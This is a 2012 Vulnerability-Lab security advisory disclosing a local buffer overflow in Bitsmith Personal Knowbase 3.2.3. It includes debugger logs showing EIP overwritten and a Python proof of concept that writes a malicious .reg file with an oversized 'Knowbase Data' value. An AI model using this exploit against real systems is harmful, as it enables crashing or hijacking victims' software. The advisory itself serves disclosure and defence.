@@ -1,0 +1,188 @@
+Title:
+======
+Bitsmith PS Knowbase 3.2.3 - Buffer Overflow Vulnerability
+
+
+Date:
+=====
+2012-03-29
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=474
+
+
+VL-ID:
+=====
+474
+
+
+Introduction:
+=============
+Personal Knowbase is a program for organizing free-form information using keywords. Build a personal knowledge base 
+of all your notes, messages, and ideas. Store and index your information in one place for easy retrieval using keywords that you 
+choose. The attachment feature even associates disk files and Internet addresses with your notes, so you can access any 
+computerized information using the same set of keywords.
+
+?  Reduce paper clutter.
+?  Save hard disk space by consolidating small text files.
+?  Gather related information together.
+?  Find your information easily.
+?  Protect your private information with passwords.
+?  Cross-reference your notes with hypertext links.
+
+(Copy of the Vendor Homepage: http://www.bitsmithsoft.com/ )
+
+
+Abstract:
+=========
+A Vulnerability Laboratory Researcher discovered a local Buffer Overflow vulnerability on Bitsmiths Personal Knowbase v3.2.3. 
+
+
+Report-Timeline:
+================
+2012-03-14:	Vendor Notification 1
+2012-03-16:	Vendor Notification 2
+2012-03-20:	Vendor Notification 3
+2012-03-30:	Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Affected Products:
+==================
+Bitsmith
+Product: Personal Knowbase v3.2.3
+
+
+Exploitation-Technique:
+=======================
+Local
+
+
+Severity:
+=========
+High
+
+
+Details:
+========
+A Buffer Overflow vulnerability is detected on Bitsmith Software Personal Knowbase v3.2.3. 
+The vulnerability is located in the main executeable knowbase.exe. An oversized string on the registry value  Knowbase Data  
+within the Key  [HKEY_CURRENT_USER/Software/Bitsmith Software/Personal Knowbase/Directories]  results in a 
+local buffer overflow. The value gets read within the FileOpen dialogue. An attacker needs to manipulate the registry 
+value and has to trick the victim to open and cancel the  FileOpen dialogue.
+
+Vulnerable Module(s):
+                                                  [+] knowbase.exe
+
+
+---  Debugger Logs  ---
+# 41414141: The instruction at 0x41414141 referenced memory at 0x41414141. The memory could not be read -> 41414141 (exc.code c0000005, tid 844)
+
+# Registers:
+# EAX 00000000
+# ECX 41414141
+# EDX 005716E8 knowbase.005716E8
+# EBX 00000001
+# ESP 0012F730 ASCII ``CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC``
+# EBP 0012F738 ASCII ``CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC``
+# ESI 00527DF8 knowbase.00527DF8
+# EDI 00570BC8 knowbase.00570BC8
+# EIP 41414141
+
+# Stack:
+# 0012F724   41414141  AAAA
+# 0012F728   FFFFFFFF      
+# 0012F72C   42424242  BBBB
+# 0012F730   43434343  CCCC
+# 0012F734   43434343  CCCC
+# 0012F738   43434343  CCCC
+# 0012F73C   43434343  CCCC
+
+# Dump:
+# 0012F710  41 41 41 41 41 41 41 41  AAAAAAAA
+# 0012F718  41 41 41 41 41 41 41 41  AAAAAAAA
+# 0012F720  41 41 41 41 41 41 41 41  AAAAAAAA
+# 0012F728  FF FF FF FF 42 42 42 42      BBBB
+# 0012F730  43 43 43 43 43 43 43 43  CCCCCCCC
+# 0012F738  43 43 43 43 43 43 43 43  CCCCCCCC
+# 0012F740  43 43 43 43 43 43 43 43  CCCCCCCC
+
+
+Picture(s):
+                                                  ../1.png
+
+
+Proof of Concept:
+=================
+The vulnerability can be exploited by local attackers. Successful exploitation requires user inter action  by clicking the dialog 
+file open or cancel. For demonstration or reproduce ...
+
+
+#!/usr/bin/python
+ 
+# Exploit Title: Bitsmith Software Personal Knowbase v3.2.3 Local Buffer Overflow 
+# Version:       3.2.3
+# Tested on:     Windows XP SP3 Professional German
+# Howto:         Import Reg -> Start App -> Open File --> Cancel
+
+file="poc.reg"
+
+junk1="\x41" * 272
+boom="\x42\x42\x42\x42"
+junk2="\x43" * 100
+
+poc="Windows Registry Editor Version 5.00\n\n"
+poc=poc + "[HKEY_CURRENT_USER\Software\Bitsmith Software\Personal Knowbase\Directories]\n"
+poc=poc + "\"Knowbase Data\"=\"" + junk1 + boom + junk2 + "\""
+
+try:
+    print "[*] Creating exploit file...\n";
+    writeFile = open (file, "w")
+    writeFile.write( poc )
+    writeFile.close()
+    print "[*] File successfully created!";
+except:
+    print "[!] Error while creating file!";
+
+
+
+Risk:
+=====
+The security risk of the local buffer overflow vulnerability is estimated as high(-).
+
+
+Credits:
+========
+Vulnerability Research Laboratory   -    Julien Ahrens  (MrTuxracer)  [www.inshell.net]
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+    						Copyright ? 2012|Vulnerability-Lab
+
+
+
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research@vulnerability-lab.com
+
+
